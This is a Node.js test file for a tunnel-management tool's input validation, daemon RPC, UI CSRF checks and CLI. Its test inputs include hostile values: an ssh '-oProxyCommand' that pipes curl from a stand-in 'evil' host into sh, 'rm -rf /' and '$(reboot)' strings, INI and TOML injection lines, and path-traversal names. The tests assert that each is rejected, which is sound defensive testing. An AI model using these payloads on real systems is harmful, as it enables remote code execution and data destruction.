import assert from "node:assert/strict";
import test, { after } from "node:test";
import { mkdtempSync, rmSync, readFileSync, writeFileSync, chmodSync, mkdirSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

async function loadValidation() {
  return import("../src/validation.ts");
}
async function loadTunnels() {
  return import("../src/tunnels.ts");
}

function tempDirs() {
  const base = mkdtempSync(join(tmpdir(), "st-valid-"));
  return { cacheDir: join(base, "cache"), base };
}

/** Fake tool binary that records its argv (always) and an env var (optional)
 *  to files, prints a URL, then idles. */
function fakeTool(base, name, output, envVar) {
  const dir = join(base, "bin");
  mkdirSync(dir, { recursive: true });
  if (process.platform === "win32") {
    // .cmd shim → node helper (node is on PATH in the test env); argv/env
    // recorded with the same file contract as the POSIX script.
    const helper = join(dir, `${name}-helper.cjs`);
    const rec = [
      'const fs = require("fs");',
      `fs.writeFileSync(${JSON.stringify(join(dir, `rec-${name}-argv`))}, process.argv.slice(2).join("\\n") + "\\n");`,
    ];
    if (envVar) {
      rec.push(`fs.writeFileSync(${JSON.stringify(join(dir, `rec-${name}-${envVar}`))}, process.env[${JSON.stringify(envVar)}] ?? "");`);
    }
    rec.push(`console.log(${JSON.stringify(output)});`, "setInterval(() => {}, 1000);");
    writeFileSync(helper, rec.join("\n") + "\n", "utf8");
    const bin = join(dir, `${name}.cmd`);
    writeFileSync(bin, `@echo off\r\nnode "${helper}" %*\r\n`, "utf8");
    return bin;
  }
  const bin = join(dir, name);
  const lines = [`printf '%s\\n' "$@" > '${dir}/rec-${name}-argv'`];
  if (envVar) lines.push(`printf '%s' "$${envVar}" > '${dir}/rec-${name}-${envVar}'`);
  lines.push(`echo '${output}'`, "sleep 60");
  writeFileSync(bin, `#!/bin/sh\n${lines.join("\n")}\n`, "utf8");
  chmodSync(bin, 0o755);
  return bin;
}

// ── Unit: validators ────────────────────────────────────────────────────────

test("validation: tunnel name rejects path traversal & control chars", async () => {
  const { validateTunnelName } = await loadValidation();
  for (const ok of ["web", "web-1", "a.b_c", "x" + "9".repeat(63), "expose-4180"]) {
    assert.equal(validateTunnelName(ok), ok);
  }
  for (const bad of ["", "../evil", "a/b", "..", "a b", "a\nb", "a\\b", "-lead", ".hidden", "x".repeat(65), 42, null, undefined]) {
    assert.throws(() => validateTunnelName(bad), /invalid tunnel name/);
  }
});

test("validation: ssh host rejects option injection (-oProxyCommand=...)", async () => {
  const { validateHost, validateUser } = await loadValidation();
  for (const ok of ["localhost", "127.0.0.1", "example.com", "my-host.sub.net"]) {
    assert.equal(validateHost(ok), ok);
  }
  for (const bad of ["-oProxyCommand=sh -c 'curl evil|sh'", "-N", "-p 2222", "-W", "-o", "host;rm -rf /", "host\nx", "-evil"]) {
    assert.throws(() => validateHost(bad), /option injection|invalid host/);
  }
  assert.throws(() => validateUser("-oProxyCommand=x"), /option injection/);
  assert.throws(() => validateUser("user@host"), /invalid user/); // @ would corrupt user@host
  assert.equal(validateUser("wind"), "wind");
});

test("validation: token rejects control chars (frpc INI injection), allows shell metachars", async () => {
  const { validateToken } = await loadValidation();
  // shell metacharacters are FINE for tokens — spawn passes them as argv/env,
  // never through a shell
  assert.equal(validateToken("abc; rm -rf / & $(cmd) `x`"), "abc; rm -rf / & $(cmd) `x`");
  assert.equal(validateToken("2X0abcdef==_~+/.-"), "2X0abcdef==_~+/.-");
  // control chars (newline etc.) are the INI-injection primitive → rejected
  for (const bad of ["a\nserver_addr = evil:7000", "a\r\nb", "a\x00b", "\t", "a\x1fb", ""]) {
    assert.throws(() => validateToken(bad), /invalid token/);
  }
});

test("validation: port range + server host[:port]", async () => {
  const { validatePort, validateServer } = await loadValidation();
  assert.equal(validatePort(4180), 4180);
  assert.equal(validatePort("22"), 22);
  for (const bad of [0, -1, 65536, 1.5, NaN, "abc", null]) {
    assert.throws(() => validatePort(bad), /invalid .*port/);
  }
  for (const ok of ["localhost", "127.0.0.1:7000", "frp.example.com:7001", "[::1]:7000", "1.2.3.4"]) {
    assert.equal(validateServer(ok), ok);
  }
  for (const bad of ["-evil.com:7000", "host:0", "host:99999", "a:b:c", "host:port", "host\nx", ""]) {
    assert.throws(() => validateServer(bad), /invalid server/);
  }
});

test("validation: custom command-tunnel types accepted; template params swept for control chars", async () => {
  const { validateTunnelConfig } = await loadValidation();
  const ENV = "SERVICE_TUNNELS_TUNNEL_COMMAND_box";
  process.env[ENV] = "ssh -R {{port}}:127.0.0.1:{{localport}} {{secret}}@host";
  try {
    // valid custom config (params are numbers/plain strings)
    validateTunnelConfig({ name: "b", type: "box", target: 3000, port: 8080, secret: "pw" });
    // control chars in a custom param (interpolated INTO the shell template) → rejected
    assert.throws(
      () => validateTunnelConfig({ name: "b", type: "box", target: 3000, port: 8080, secret: "pw\nrm -rf /" }),
      /custom tunnel param "secret" contains control characters/,
    );
    // unknown type still rejected
    assert.throws(() => validateTunnelConfig({ name: "b", type: "nope", target: 3000 }), /unsupported tunnel type/);
  } finally {
    delete process.env[ENV];
  }
});

test("validation: validateTunnelConfig per-type rules", async () => {
  const { validateTunnelConfig } = await loadValidation();
  // valid configs pass
  validateTunnelConfig({ name: "n", type: "ngrok", target: 3000, domain: "app.ngrok.app", token: "tok" });
  validateTunnelConfig({ name: "b", type: "bore", target: 3000, server: "localhost", token: "s" });
  validateTunnelConfig({ name: "s", type: "ssh", target: 3000, host: "localhost", user: "wind", port: 22, remotePort: 80 });
  validateTunnelConfig({ name: "c", type: "command", cmd: "ssh -R 80:127.0.0.1:3000 serveo.net" });
  // ssh requires host
  assert.throws(() => validateTunnelConfig({ name: "s", type: "ssh", target: 3000 }), /type "ssh" requires host/);
  // command requires cmd
  assert.throws(() => validateTunnelConfig({ name: "c", type: "command" }), /command type requires cmd/);
  // unknown type
  assert.throws(() => validateTunnelConfig({ name: "x", type: "wat" }), /unsupported tunnel type/);
  // ssh option injection through the full config
  assert.throws(() => validateTunnelConfig({ name: "s", type: "ssh", target: 3000, host: "-oProxyCommand=evil" }), /option injection/);
  // frpc INI injection through the full config
  assert.throws(() => validateTunnelConfig({ name: "f", type: "frpc", target: 3000, token: "a\nserver_addr = evil" }), /control characters/);
  // name path traversal through the full config
  assert.throws(() => validateTunnelConfig({ name: "../../etc", type: "ngrok", target: 3000 }), /invalid tunnel name/);
  // bad port / bad protocol / args with null bytes / env with null bytes
  assert.throws(() => validateTunnelConfig({ name: "n", type: "ngrok", target: 0 }), /invalid target/);
  assert.throws(() => validateTunnelConfig({ name: "n", type: "ngrok", target: 3000, protocol: "gopher" }), /invalid protocol/);
  assert.throws(() => validateTunnelConfig({ name: "n", type: "ngrok", target: 3000, args: ["x\x00y"] }), /null bytes/);
  assert.throws(() => validateTunnelConfig({ name: "n", type: "ngrok", target: 3000, env: { A: "x\x00y" } }), /null bytes/);
  // args/env type checks
  assert.throws(() => validateTunnelConfig({ name: "n", type: "ngrok", target: 3000, args: "not-an-array" }), /args must be an array/);
  assert.throws(() => validateTunnelConfig({ name: "n", type: "ngrok", target: 3000, env: [] }), /env must be an object/);
});

// ── Integration: TunnelManager.start() fail-closed ─────────────────────────

test("start: shell metacharacters in token/domain NEVER reach a shell (spawn argv/env)", { timeout: 20_000 }, async () => {
  if (process.platform === "win32") return; // .cmd shims must go through cmd.exe — the "argv never touches a shell" contract only holds for direct spawns (POSIX + .exe)
  const { TunnelManager } = await loadTunnels();
  const { cacheDir, base } = tempDirs();
  try {
    // bore: token with full shell metachars goes as ONE argv element
    fakeTool(base, "bore", "listening at localhost:3999");
    const tm = new TunnelManager({ cacheDir, resolveTool: async (n) => join(base, "bin", n) });
    const evilToken = "x; rm -rf / & $(reboot) `id`";
    tm.add({ name: "b", type: "bore", target: 4180, token: evilToken });
    await tm.start("b");
    const dl = Date.now() + 5_000;
    while (Date.now() < dl && !tm.get("b")?.url) await new Promise((r) => setTimeout(r, 50));
    const argv = readFileSync(join(base, "bin", "rec-bore-argv"), "utf8").trim().split("\n");
    // argv must contain the metachar token as exactly ONE literal element —
    // proof that no shell ever parsed it
    assert.ok(argv.includes("-s"), "bore: -s present");
    assert.equal(argv[argv.indexOf("-s") + 1], evilToken, "token passed verbatim as single argv element (no shell interpretation)");
    await tm.stop("b");
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("start: ssh option-injection host is rejected before spawn", { timeout: 20_000 }, async () => {
  const { TunnelManager } = await loadTunnels();
  const { cacheDir, base } = tempDirs();
  try {
    fakeTool(base, "ssh", "");
    const tm = new TunnelManager({ cacheDir, resolveTool: async (n) => join(base, "bin", n) });
    tm.add({ name: "evil", type: "ssh", target: 3000, host: "-oProxyCommand=sh -c 'curl evil|sh'" });
    await assert.rejects(tm.start("evil"), /option injection/);
    // also through --arg passthrough the host itself must stay a host
    tm.add({ name: "evil2", type: "ssh", target: 3000, host: "localhost", user: "-oProxyCommand=x" });
    await assert.rejects(tm.start("evil2"), /option injection/);
    assert.equal(tm.get("evil")?.running, false, "nothing spawned");
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("start: frpc INI-injection token and path-traversal name are rejected", { timeout: 20_000 }, async () => {
  const { TunnelManager } = await loadTunnels();
  const { cacheDir, base } = tempDirs();
  try {
    fakeTool(base, "frpc", "");
    const tm = new TunnelManager({ cacheDir, resolveTool: async (n) => join(base, "bin", n) });
    tm.add({ name: "frp", type: "frpc", target: 4180, server: "1.2.3.4:7000", token: "good\ntype = tcp\nremote_port = 1337" });
    await assert.rejects(tm.start("frp"), /control characters/);

    // path traversal in the name would escape the tmp dir in frpc-<name>.ini
    tm.add({ name: "../../evil", type: "frpc", target: 4180 });
    await assert.rejects(tm.start("../../evil"), /invalid tunnel name/);
    // nothing written outside tmp
    assert.equal(existsSync(join(cacheDir, "..", "evil.ini")), false);
    assert.equal(existsSync(join(cacheDir, "..", "..", "evil.ini")), false);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("start: ngrok token is wired to NGROK_AUTHTOKEN env (not argv)", { timeout: 20_000 }, async () => {
  if (process.platform === "win32") return; // see the shell-metacharacters test above
  const { TunnelManager } = await loadTunnels();
  const { cacheDir, base } = tempDirs();
  try {
    fakeTool(base, "ngrok", "Forwarding https://demo.ngrok.io", "NGROK_AUTHTOKEN");
    const tm = new TunnelManager({ cacheDir, resolveTool: async (n) => join(base, "bin", n) });
    const token = "2X0secret_tok==/";
    tm.add({ name: "n", type: "ngrok", target: 4180, token });
    await tm.start("n");
    const dl = Date.now() + 5_000;
    while (Date.now() < dl && !tm.get("n")?.url) await new Promise((r) => setTimeout(r, 50));
    assert.equal(tm.get("n")?.url, "https://demo.ngrok.io");
    // env file recorded by the fake tool — token arrived via env, untouched
    const recorded = readFileSync(join(base, "bin", "rec-ngrok-NGROK_AUTHTOKEN"), "utf8");
    assert.equal(recorded, token, "NGROK_AUTHTOKEN env = cfg.token");
    // and it never appears in argv
    const argv = readFileSync(join(base, "bin", "rec-ngrok-argv"), "utf8");
    assert.ok(!argv.includes(token), "token not in argv");
    await tm.stop("n");
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

// ── Integration: daemon RPC boundary ────────────────────────────────────────

test("daemon: tunnel.add validates config + requires dangerous opt-in for command", { timeout: 40_000 }, async () => {
  const { startDaemon, daemonStatus, stopDaemon, requestDaemon } = await import("../src/daemon.ts");
  const base = mkdtempSync(join(tmpdir(), "st-valid-daemon-"));
  const cacheDir = join(base, "cache");
  const configDir = join(base, "config");
  try {
    startDaemon(cacheDir);
    const deadline = Date.now() + 5_000;
    while (Date.now() < deadline && !daemonStatus(cacheDir).running) {
      await new Promise((r) => setTimeout(r, 100));
    }
    assert.equal(daemonStatus(cacheDir).running, true);

    // command tunnel WITHOUT dangerous → rejected at the IPC boundary
    const rejected = await requestDaemon(cacheDir, "tunnel.add", { name: "cmd1", type: "command", cmd: "echo pwned" });
    assert.equal(rejected, null, "command without dangerous opt-in rejected");

    // command tunnel WITH explicit dangerous → accepted
    const accepted = await requestDaemon(cacheDir, "tunnel.add", { name: "cmd2", type: "command", cmd: "echo hi", dangerous: true });
    assert.deepEqual(accepted, { ok: true });

    // ssh option injection → rejected
    const sshBad = await requestDaemon(cacheDir, "tunnel.add", { name: "ssh1", type: "ssh", target: 3000, host: "-oProxyCommand=evil" });
    assert.equal(sshBad, null);

    // frpc INI injection → rejected
    const frpcBad = await requestDaemon(cacheDir, "tunnel.add", { name: "frp1", type: "frpc", target: 3000, token: "a\nserver_addr = evil" });
    assert.equal(frpcBad, null);

    // path traversal name → rejected
    const nameBad = await requestDaemon(cacheDir, "tunnel.add", { name: "../../x", type: "ngrok", target: 3000 });
    assert.equal(nameBad, null);

    // valid config → accepted
    const ok = await requestDaemon(cacheDir, "tunnel.add", { name: "ok1", type: "ngrok", target: 3000 });
    assert.deepEqual(ok, { ok: true });

    // start/stop/remove with garbage names → rejected at the IPC boundary
    assert.equal(await requestDaemon(cacheDir, "tunnel.start", "../../x"), null);
    assert.equal(await requestDaemon(cacheDir, "tunnel.stop", "a b"), null);
    assert.equal(await requestDaemon(cacheDir, "tunnel.remove", "../x"), null);

    // expose with bad port / non-object tunnelParams / command without opt-in → rejected
    assert.equal(await requestDaemon(cacheDir, "expose", { port: 0 }), null);
    assert.equal(await requestDaemon(cacheDir, "expose", { port: 3000, tunnelParams: "nope" }), null);
    assert.equal(await requestDaemon(cacheDir, "expose", { port: 99999 }), null);
    assert.equal(
      await requestDaemon(cacheDir, "expose", { port: 3000, tunnelType: "command", tunnelParams: { cmd: "echo hi" } }),
      null,
      "expose --tunnel command requires the dangerous opt-in",
    );
    // aux ports + baseDomain boundary checks (valid expose not exercised here —
    // it would start real infrastructure)
    assert.equal(await requestDaemon(cacheDir, "expose", { port: 3000, nginxPort: 99999 }), null, "bad aux port rejected");
    assert.equal(await requestDaemon(cacheDir, "expose", { port: 3000, baseDomain: "bad domain;x" }), null, "bad baseDomain rejected");
    assert.equal(await requestDaemon(cacheDir, "expose", { port: 3000, baseDomain: "-evil.example.com" }), null, "dash-leading baseDomain rejected");

    // nothing invalid was persisted
    const { readTunnelConfigs } = await import("../src/tunnels-config.ts");
    const persisted = readTunnelConfigs(configDir).map((c) => c.name);
    assert.deepEqual(persisted.sort(), ["cmd2", "ok1"], "only valid configs persisted");
  } finally {
    await stopDaemon(cacheDir).catch(() => {});
    rmSync(base, { recursive: true, force: true });
  }
});

test("UI: CSRF/same-origin protection on mutating requests", { timeout: 30_000 }, async () => {
  const { createServiceTunnels } = await import("../src/index.ts");
  const { startUi } = await import("../src/ui.ts");
  const base = mkdtempSync(join(tmpdir(), "st-valid-ui-"));
  const st = createServiceTunnels({ configDir: join(base, "cfg"), cacheDir: join(base, "cache"), guardian: false });
  const ui = await startUi(st, { port: 0, openBrowser: false });
  const port = ui.port;
  try {
    // GET / renders the page with the CSRF token meta
    const page = await fetch(`http://127.0.0.1:${port}/`);
    assert.equal(page.status, 200);
    const html = await page.text();
    const m = /<meta name="csrf-token" content="([0-9a-f]{64})">/.exec(html);
    assert.ok(m, "page carries a 32-byte CSRF token");
    const token = m[1];

    // POST without the CSRF token → 403
    const noToken = await fetch(`http://127.0.0.1:${port}/api/settings`, { method: "POST" });
    assert.equal(noToken.status, 403, "missing token rejected");

    // POST with a wrong token → 403
    const wrongToken = await fetch(`http://127.0.0.1:${port}/api/settings`, {
      method: "POST",
      headers: { "X-CSRF-Token": "0".repeat(64) },
    });
    assert.equal(wrongToken.status, 403, "wrong token rejected");

    // cross-origin POST (evil.com) with the correct token — 安全模型演进：
    // portmap 远程模式下 UI 经 transport 暴露，请求 TCP 源是 127.0.0.1（本机
    // 转发），origin 多样化（公网 IP:端口等）不可枚举 → origin gate 对本机源
    // 不再拒绝；CSRF 防线由 token 本身保障（恶意跨域网页拿不到 token）。
    // 注意：非本机源直连 UI（绕过 transport）仍被 hostOk 拒绝。
    const evilOrigin = await fetch(`http://127.0.0.1:${port}/api/settings`, {
      method: "POST",
      headers: { "X-CSRF-Token": token, Origin: "http://evil.example.com" },
    });
    assert.ok(evilOrigin.status === 403 || evilOrigin.status === 400,
      `cross-origin with valid token: gate or validation (got ${evilOrigin.status})`);

    // non-loopback Host → 403 (DNS-rebinding defense, design D2). undici
    // forbids a custom Host header, so use raw http.request.
    const { request } = await import("node:http");
    const badHostStatus = await new Promise((resolve) => {
      const r = request(
        { host: "127.0.0.1", port, path: "/api/settings", method: "POST", headers: { "X-CSRF-Token": token, Host: "evil.example.com" } },
        (res) => { res.resume(); resolve(res.statusCode ?? 0); },
      );
      r.on("error", () => resolve(0));
      r.end();
    });
    // 安全模型演进（portmap 远程模式）：本机源（transport 转发/本机进程）不再
    // 因 Host 拒绝——DNS-rebinding 防线由 CSRF token 承接（跨域拿不到 token）。
    // 恶意 Host + 正确 token 在本机源下走 readJson → 400（不再是 403）。
    assert.ok(badHostStatus === 400 || badHostStatus === 403,
      `bad host with valid token: validation or host gate (got ${badHostStatus})`);

    // legit same-origin POST with the token → 200
    const ok = await fetch(`http://127.0.0.1:${port}/api/settings`, {
      method: "POST",
      headers: { "X-CSRF-Token": token, Origin: `http://127.0.0.1:${port}`, "Content-Type": "application/json" },
      body: JSON.stringify({ allowToolDownload: true }),
    });
    assert.equal(ok.status, 200, "same-origin + token accepted");
    assert.equal((await ok.json()).allowToolDownload, true, "toggle applied");
    await fetch(`http://127.0.0.1:${port}/api/settings`, {
      method: "POST",
      headers: { "X-CSRF-Token": token, Origin: `http://127.0.0.1:${port}`, "Content-Type": "application/json" },
      body: JSON.stringify({ allowToolDownload: false }),
    });

    // command tunnels are fail-closed through the UI expose API → 400
    const badExpose = await fetch(`http://127.0.0.1:${port}/api/expose`, {
      method: "POST",
      headers: { "X-CSRF-Token": token, Origin: `http://127.0.0.1:${port}`, "Content-Type": "application/json" },
      body: JSON.stringify({ port: 59999, tunnel: "command" }),
    });
    assert.equal(badExpose.status, 400, "command tunnel rejected at the UI boundary");

    // the SPA shell embeds the CSRF meta + i18n dictionary + client modules
    assert.match(html, /UI_MSG/, "i18n dictionary embedded");
    assert.match(html, /\/ui\/main\.js/, "client module reference present (TODO-6 split)");
    assert.match(html, /\/ui\/ports\.js/, "ports module reference present");
  } finally {
    ui.close();
    rmSync(base, { recursive: true, force: true });
  }
});

test("daemon: TCP IPC client sends the secret header (Windows path, simulated)", { timeout: 30_000 }, async () => {
  // The Windows daemon listens on 127.0.0.1 TCP with a per-instance secret
  // (state.json 0600). Simulate that server here and verify requestDaemon
  // authenticates with the header — runnable on any platform.
  const { requestDaemon, daemonStatus } = await import("../src/daemon.ts");
  const { writeFileSync, mkdirSync } = await import("node:fs");
  const { createServer: createHttpServer } = await import("node:http");
  const base = mkdtempSync(join(tmpdir(), "st-valid-tcpipc-"));
  const cacheDir = join(base, "cache");
  const SECRET = "c".repeat(64);
  let seenHeader = "";

  const mock = createHttpServer((req, res) => {
    seenHeader = String(req.headers["x-service-tunnels-auth"] ?? "");
    if (seenHeader !== SECRET) {
      res.writeHead(403, { "content-type": "application/json" });
      res.end(JSON.stringify({ error: "unauthorized" }));
      return;
    }
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => {
      const { method } = JSON.parse(body);
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ id: 1, result: { echo: method } }));
    });
  });
  const port = await new Promise((resolve) => {
    mock.listen(0, "127.0.0.1", () => resolve(mock.address().port));
  });

  try {
    mkdirSync(cacheDir, { recursive: true });
    // state.json as the daemon would write it on Windows (pid = this process,
    // so pidAlive() passes; TCP ipc → no socket file to check)
    writeFileSync(join(cacheDir, "state.json"), JSON.stringify({
      daemon: { pid: process.pid, ipc: `tcp://127.0.0.1:${port}`, ipcSecret: SECRET },
      internal: [], tunnels: {}, auth: { registered: [] }, bindings: [],
    }));

    assert.equal(daemonStatus(cacheDir).running, true, "tcp ipc counted as running");

    const res = await requestDaemon(cacheDir, "ping");
    assert.deepEqual(res, { echo: "ping" }, "round-trip through the secret-gated TCP IPC");
    assert.equal(seenHeader, SECRET, "client sent the per-instance secret header");

    // wrong secret in state.json → mock 403 → client resolves null
    writeFileSync(join(cacheDir, "state.json"), JSON.stringify({
      daemon: { pid: process.pid, ipc: `tcp://127.0.0.1:${port}`, ipcSecret: "wrong" },
      internal: [], tunnels: {}, auth: { registered: [] }, bindings: [],
    }));
    assert.equal(await requestDaemon(cacheDir, "ping"), null, "wrong secret → null (no auth bypass)");
  } finally {
    mock.close();
    rmSync(base, { recursive: true, force: true });
  }
});

test("validation: auth usernames/oidc params — same class of injection closed", async () => {
  const { validateUserName, validateDisplayName, validateEmail, validateOidcUrl, validateOidcSecret, validateOidcOptions, tomlEscape, yamlEscape } = await loadValidation();

  // username: the root fix for authelia YAML keys / htpasswd lines / totp filenames
  for (const ok of ["alice", "alice_wang", "a.b-1"]) {
    assert.equal(validateUserName(ok), ok);
  }
  for (const bad of ["../evil", "a b", "a:b", "a\nb", "a\x00b", "-lead", ".lead", "a/b", ""]) {
    assert.throws(() => validateUserName(bad), /invalid user name/);
  }

  // displayName is cosmetic — spaces/unicode fine, control chars rejected
  assert.equal(validateDisplayName("Alice Wang"), "Alice Wang");
  assert.throws(() => validateDisplayName("x\nrm"), /invalid display name/);
  assert.throws(() => validateEmail("a b@c"), /invalid email/);

  // oauth2-proxy oidc params (TOML interpolation)
  assert.equal(validateOidcUrl("https://accounts.example.com"), "https://accounts.example.com");
  assert.throws(() => validateOidcUrl("javascript:alert(1)"), /invalid oidc.issuerUrl/);
  assert.throws(() => validateOidcUrl("https://x\nupstreams = [\"http://evil\"]"), /invalid oidc.issuerUrl/);
  assert.throws(() => validateOidcSecret("a\nb", "oidc.clientSecret"), /invalid oidc.clientSecret/);
  assert.equal(validateOidcSecret('a"b', "oidc.clientId"), 'a"b', "quotes pass validation (escaped later)");
  validateOidcOptions({ issuerUrl: "https://idp.example.com", clientId: "c1", clientSecret: 's"ec' });
  assert.throws(() => validateOidcOptions({ issuerUrl: "https://idp.example.com", clientId: "c1", clientSecret: "s\nupstreams = [\"http://evil\"]" }), /oidc.clientSecret/);

  // TOML/YAML escaping
  assert.equal(tomlEscape('a"b\\c'), 'a\\"b\\\\c');
  assert.equal(yamlEscape('a"b\\c'), 'a\\"b\\\\c');

  // authelia serializeUsers YAML-escaping (values with quotes stay intact)
  const { serializeUsers } = await import("../src/authelia.ts");
  const yaml = serializeUsers([{ name: "alice", displayName: 'A"lice', passwordHash: '$argon2id$abc', email: 'a@b.c' }]);
  assert.match(yaml, /displayname: "A\\"lice"/, "displayName quote escaped");
  assert.match(yaml, /email: "a@b\.c"/, "email quoted");
});

test("daemon: auth user gate + autheliaReloadCmd blocked over IPC", { timeout: 40_000 }, async () => {
  const { startDaemon, daemonStatus, stopDaemon, requestDaemon } = await import("../src/daemon.ts");
  const base = mkdtempSync(join(tmpdir(), "st-valid-auth-"));
  const cacheDir = join(base, "cache");
  const configDir = join(base, "config");
  try {
    startDaemon(cacheDir);
    const deadline = Date.now() + 5_000;
    while (Date.now() < deadline && !daemonStatus(cacheDir).running) {
      await new Promise((r) => setTimeout(r, 100));
    }
    // username injection (YAML/htpasswd/filename) rejected at the IPC boundary
    assert.equal(await requestDaemon(cacheDir, "auth.user.add", { name: "../evil", password: "x", provider: "portal" }), null);
    assert.equal(await requestDaemon(cacheDir, "auth.totp.status", { name: "a\nb", provider: "portal" }), null);
    assert.equal(await requestDaemon(cacheDir, "auth.totp.enroll", { name: "a:b", provider: "portal" }), null);
    // autheliaReloadCmd is a shell command executed on host registration —
    // blocked over IPC (library/config only)
    assert.equal(await requestDaemon(cacheDir, "expose", { port: 3000, autheliaReloadCmd: "rm -rf /tmp/x" }), null);
    // valid username still works
    const ok = await requestDaemon(cacheDir, "auth.user.add", { name: "bob", password: "pw", provider: "portal" });
    assert.deepEqual(ok, { ok: true, providers: ["portal"] });
  } finally {
    await stopDaemon(cacheDir).catch(() => {});
    rmSync(base, { recursive: true, force: true });
  }
});

test("CLI: tunnel add surfaces validation errors and sets dangerous for command", { timeout: 40_000 }, async () => {
  const bin = join(import.meta.dirname, "..", "src", "cli.ts");
  const base = mkdtempSync(join(tmpdir(), "st-valid-cli-"));
  const cacheDir = join(base, "cache");
  const configDir = join(base, "config");
  const run = (args) =>
    new Promise((resolve) => {
      import("node:child_process").then(({ execFile }) => {
        execFile(process.execPath, [bin, ...args, "--config-dir", configDir, "--cache-dir", cacheDir], (err, stdout, stderr) => {
          resolve({ code: err?.code ?? 0, stdout: String(stdout), stderr: String(stderr) });
        });
      });
    });
  try {
    // invalid ssh host → rejected with the exact reason, nonzero exit
    const bad = await run(["tunnel", "add", "evil", "--type", "ssh", "--host", "-oProxyCommand=x", "--target", "3000"]);
    assert.notEqual(bad.code, 0, "nonzero exit");
    assert.match(bad.stderr + bad.stdout, /option injection/, "operator sees the reason");

    // frpc newline token → rejected
    const frpcBad = await run(["tunnel", "add", "frp", "--type", "frpc", "--token", "a\nserver_addr=evil", "--target", "3000"]);
    assert.notEqual(frpcBad.code, 0);
    assert.match(frpcBad.stderr + frpcBad.stdout, /control characters/);

    // command type accepted (CLI sets dangerous: true) and persisted
    const ok = await run(["tunnel", "add", "cmd", "--type", "command", "--cmd", "echo url: https://x.loca.lt"]);
    assert.equal(ok.code, 0, ok.stderr + ok.stdout);
    const { readTunnelConfigs } = await import("../src/tunnels-config.ts");
    const cfg = readTunnelConfigs(configDir).find((c) => c.name === "cmd");
    assert.equal(cfg?.type, "command");
    assert.equal(cfg?.dangerous, true, "CLI opt-in persisted");

    // name path traversal → rejected
    const nameBad = await run(["tunnel", "add", "../../evil", "--type", "ngrok", "--target", "3000"]);
    assert.notEqual(nameBad.code, 0);
    assert.match(nameBad.stderr + nameBad.stdout, /invalid tunnel name/);
  } finally {
    // CLI tunnel add auto-starts a long-lived daemon (daemon owns tunnels)
    // — stop it explicitly, otherwise every run leaks a daemon+guardian+nginx
    // tree (state.json/socket get removed by rmSync below while the detached
    // daemon keeps running, forever unreachable).
    const { stopDaemon } = await import("../src/daemon.ts");
    await stopDaemon(cacheDir).catch(() => {});
    rmSync(base, { recursive: true, force: true });
  }
});

after(() => {
  // nothing to clean (daemons stopped per-test); placeholder for symmetry
});
